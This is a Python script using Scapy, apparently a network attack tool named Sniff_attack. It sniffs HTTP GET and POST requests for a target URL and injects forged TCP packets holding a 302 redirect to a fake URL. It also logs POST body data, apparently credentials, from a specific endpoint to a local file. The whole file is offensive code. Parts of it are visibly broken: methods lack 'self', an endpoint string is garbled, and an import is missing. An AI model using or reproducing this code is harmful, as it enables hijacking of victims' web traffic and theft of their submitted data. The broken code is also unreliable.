from scapy.all import *

class Sniff_attack:
    def __init__(self):
        self.trueurl = ""
        self.fakeurl = ""
        self.interface = ""
  
    def sniffData(pkt):
        if pkt.haslayer( Raw ):
            header = pkt.getlayer( Raw ).load
            if header.startswith(bytes('GET', 'utf-8')) or header.startswith(bytes('POST', 'utf-8')):
                if bytes(self.trueurl, 'utf-8') in header:
                    src = pkt.getlayer(IP).src
                    dst = pkt.getlayer(IP).dst
                    print(src + " / " + dst, file=open("packets.txt", "a"))
                    print(header, file=open("packets.txt", "a"))
                    print('------------------------------------', file=open("packets.txt", "a"))
                    ip = pkt.getlayer(IP)
                    tcp = pkt.getlayer(TCP)
                    http_payload = "HTTP/1.1 302 Found\r\nLocation: %s\r\nContent-Length: 0\r\nConnection: close\r\n\r\n" % self.fakeurl
                    resp = IP(dst=ip.src, src=ip.dst) / TCP(dport=ip.sport,sport=ip.dport, flags="PA") / Raw(load=http_payload)
                    print(ip.src + " / " + ip.dst + " / " + str(ip.dport) + " / " + str(ip.sport), file=open("packets.txt", "a"))
                    print(http_payload, file=open("packets.txt", "a"))
                    sendp(resp, iface=self.interface)
                    if header.startswith(bytes('POST', 'utf-8')):
                        if bytes('/api/Sercapy send packetvicesConnection.php', 'utf-8') in header:
                            print(header, file=open("packets.txt", "a"))
                            data = header.split(bytes('\r\n\r\n','utf-8'))[1]
                            print(("[%s] POST data Captured: %s" % (src, data)), file=open("packets.txt", "a"))
                            print('------------------------------------', file=open("packets.txt", "a"))
    def startSniff():
        sniff(iface=self.interface, prn=sniffData)
    def launchSniff():
        poison_thread = threading.Thread(target=startSniff, args=())
        poison_thread.deamon = True
        poison_thread.start()